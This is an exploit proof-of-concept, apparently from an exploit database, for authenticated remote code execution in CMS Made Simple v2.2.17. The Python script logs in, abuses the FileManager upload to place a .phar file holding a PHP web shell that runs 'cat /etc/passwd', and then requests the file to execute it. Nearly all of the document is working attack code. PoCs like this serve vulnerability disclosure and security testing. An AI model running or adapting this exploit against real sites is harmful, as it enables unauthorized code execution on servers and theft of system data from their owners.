#Exploit Title: CmsMadeSimple v2.2.17 - Remote Code Execution (RCE) 
#Application: CmsMadeSimple
#Version: v2.2.17
#Bugs:  Remote Code Execution(RCE) 
#Technology: PHP
#Vendor URL: https://www.cmsmadesimple.org/
#Software Link: https://www.cmsmadesimple.org/downloads/cmsms
#Date of found: 12-07-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux 


import requests

login_url = 'http://localhost/admin/login.php'
username=input('username = ') 
password=input('password = ') 


upload_url = 'http://localhost/admin/moduleinterface.php'

file_path = input("please phar file name but file must same directory with python file and file content : <?php echo system('cat /etc/passwd') ?>  : ")
#phar file content """"<?php echo system('cat /etc/passwd') ?>"""""

login_data = {
    'username': username,
    'password': password,
    'loginsubmit': 'Submit'
}


session = requests.Session()
response = session.post(login_url, data=login_data)


if response.status_code == 200:
    print('Login account')
else:
    print('Login promlem.')
    exit()


files = {
    'm1_files[]': open(file_path, 'rb')
}

data = {
    'mact': 'FileManager,m1_,upload,0',
    '__c': session.cookies['__c'],
    'disable_buffer': '1'
}


response = session.post(upload_url, files=files, data=data)


if response.status_code == 200:
    print('file upload')
    rce_url=f"http://localhost/uploads/{file_path}"
    rce=requests.get(rce_url)
    print(rce.text)
else:
    print('file not upload')


